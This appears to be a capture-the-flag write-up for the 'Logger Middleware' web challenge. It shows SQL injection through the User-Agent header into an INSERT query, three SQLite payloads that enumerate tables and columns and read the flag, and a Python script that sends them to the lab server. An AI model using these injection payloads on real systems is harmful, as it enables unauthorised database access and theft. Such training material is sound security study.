---
title: Logger Middleware
author: lehai
date: 2023-12-12 14:10:00 +0800
categories: [web]
tags: [web,ctf,write-up]
image:
  path: /assets/img/favicons/cookiearena.png
---

## Logger Middleware

#### By @es

[Address challenge](https://battle.cookiearena.org/challenges/web/logger-middleware)
The goal of this challenge is to query the hidden data in database(Flag)

### Chanllenge Details
- Format flag:CHH{XXX}
- Web
- SQL Injection
### Web Analysis
This website has the function of recording user logs

![](/assets/img/writeup/Logger-Middleware/1.png)

To save the log into the database, we guess the query command will be insert into

Looking at the http header, the <b style="color:red">User-Agent</b> is untrusted. Because other headers such as cookie, host, if adjusted, will lead to transmission errors causing us to disconnect from the website.

![](/assets/img/writeup/Logger-Middleware/2.png)

 Add a ' or " sign after the User-Agent value to determine which quotation marks should be used in the query

 The website prints an error that helps us determine the website's query

![](/assets/img/writeup/Logger-Middleware/3.png)

This is the website's query

<b> INSERT INTO logger (ip_address, user_agent, referer, url, cookie, created_at) VALUES ('***', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:124.0) Gecko/20100101 Firefox/124.0'', 'None', 'http://103.97.125.56:31292/', 'None', '2024-04-08 01:19:08.677431')</b>

<b>FIND_TABLE</b>: test',(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'),null,null,null) -- '

![](/assets/img/writeup/Logger-Middleware/4.png)

<b>FIND_COLUMNS</b>: test',(SELECT GROUP_CONCAT(name) FROM pragma_table_info('flag')),null,null,null)  -- '

![](/assets/img/writeup/Logger-Middleware/5.png)

<b>FIND_FLAG</b>: test',(SELECT secr3t_flag FROM flag),null,null,null)  -- '

![](/assets/img/writeup/Logger-Middleware/6.png)

I wrote a piece of python code to exploit the challenge

```python
import requests
from bs4 import BeautifulSoup

PAYLOADS = {
    'FIND_TABLE':"test',(SELECT GROUP_CONCAT(name) FROM sqlite_master WHERE type='table' AND name NOT LIKE 'sqlite_%'),null,null,null) -- '",
    'FIND_COLUMNS':"test',(SELECT GROUP_CONCAT(name) FROM pragma_table_info('flag')),null,null,null)  -- '",
    'FIND_FLAG':"test',(SELECT secr3t_flag FROM flag),null,null,null)  -- '"
}
url="http://103.97.125.56:31292/"
for key, value in PAYLOADS.items():
    headers = {"User-Agent": value}
    print("Testing: ",headers)
    r = requests.get(url, headers=headers)
    data = r.text 
    soup = BeautifulSoup(data, 'html.parser')
    td_element = soup.find_all('td')[2] 
    data = td_element.get_text()
    print(key,": ",data)

    
```

![](/assets/img/writeup/Logger-Middleware/7.png)

## Thanks for watching !!!
